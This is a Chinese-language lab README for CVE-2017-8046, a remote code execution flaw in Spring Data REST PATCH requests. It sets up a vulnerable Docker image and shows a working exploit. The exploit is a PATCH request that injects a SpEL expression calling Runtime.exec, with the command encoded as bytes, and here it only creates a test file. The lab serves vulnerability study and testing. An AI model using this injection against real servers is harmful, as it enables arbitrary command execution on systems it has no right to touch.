## Spring Data REST PATCH请求代码执行漏洞(CVE-2017-8046)

### 漏洞信息

 * [CVE-2017-8046: RCE in PATCH requests in Spring Data REST](https://pivotal.io/security/cve-2017-8046)
 * [这个Spring高危漏洞，你修补了吗？--  其河@美团点评技术团队](https://mp.weixin.qq.com/s/uTiWDsPKEjTkN6z9QNLtSA)

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:s_spring_1
 ```

2. 启动环境

 ```
$ docker run -d -p 8080:8080 medicean/vulapps:s_spring_1
 ```
 > `-p 8080:8080` 前面的 8080 代表物理机的端口，可随意指定。 

### 使用与利用

访问 `http://你的 IP 地址:端口号/`, 假设启动的端口号为 8080

#### PoC

1. 访问 `http://127.0.0.1:8080/`，测试服务是否启动成功

 ![](https://github.com/Medicean/VulApps/raw/master/s/spring/1/poc-1.png)

2. 利用 POST 请求添加一个数据

	```
	POST /persons HTTP/1.1
	Host: 127.0.0.1:8080
	Content-Type: application/json
	Cache-Control: no-cache
	
	{"firstName": "VulApps", "lastName": "VulApps"}
	```
 ![](https://github.com/Medicean/VulApps/raw/master/s/spring/1/poc-2.png)

3. 执行 PoC

  执行命令为: `/usr/bin/touch /tmp/vuln`，注意 Content-Type 值为 `application/json-patch+json`

```
PATCH /persons/1 HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json-patch+json
Cache-Control: no-cache
Content-Length: 228
	
[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{47,117,115,114,47,98,105,110,47,116,111,117,99,104,32,47,116,109,112,47,118,117,108,110}))/lastName", "value": "vulapps-demo" }]
```
 ![](https://github.com/Medicean/VulApps/raw/master/s/spring/1/poc-3.png)

4. 进入容器，发现成功创建文件

 ![](https://github.com/Medicean/VulApps/raw/master/s/spring/1/poc-4.png)

### 参考链接

* [这个Spring高危漏洞，你修补了吗？--  其河@美团点评技术团队](https://mp.weixin.qq.com/s/uTiWDsPKEjTkN6z9QNLtSA)

### 改动日志

* 2017/09/29 删除原 jar 包中 mongodb 依赖
